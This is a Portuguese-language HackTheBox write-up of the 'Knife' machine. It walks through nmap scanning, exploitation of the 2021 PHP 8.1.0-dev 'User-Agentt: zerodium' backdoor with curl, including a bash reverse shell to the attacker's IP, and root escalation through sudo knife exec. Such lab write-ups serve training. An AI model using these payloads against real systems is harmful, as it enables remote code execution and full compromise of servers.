Knife

HackTheBox · Easy by Brenno M.

Knife serve um site com o PHP 8.1.0-dev, a versão que recebeu um commit malicioso no repositório oficial em 2021: um cabeçalho User-Agentt iniciado por zerodium executa código. A escalação abusa do sudo no knife, a CLI do Chef.

Reconhecimento

Só SSH e Apache estão abertos. O fuzzing não acha nada útil, mas o cabeçalho X-Powered-By entrega a versão do PHP.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p22,80 <IP>
# 22 OpenSSH 8.2p1, 80 Apache 2.4.41 (Emergent Medical Idea)
curl -I http://<IP>/index.php
# X-Powered-By: PHP/8.1.0-dev

Exploração - backdoor do PHP 8.1.0-dev

Em março de 2021, dois commits forjados no php-src adicionaram um trecho que avalia o conteúdo do cabeçalho User-Agentt (com dois "t") quando ele começa com zerodium. Primeiro um teste, depois a reverse shell como james.

curl -s http://<IP>/index.php -H 'User-Agentt: zerodiumsystem("id");' | head -1
# uid=1000(james)
nc -lvnp 1234
curl http://<IP>/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/<MEU_IP>/1234 0>&1'\");"
cat /home/james/user.txt

Escalação - sudo knife

O james roda o knife como root sem senha. O subcomando knife exec executa Ruby arbitrário (GTFOBins). Outro caminho é abrir um data bag no vi com -e vi e chamar :!/bin/sh.

sudo -l
# (root) NOPASSWD: /usr/bin/knife
sudo knife exec -E 'exec "/bin/sh"'
id   # uid=0(root)
cat /root/root.txt
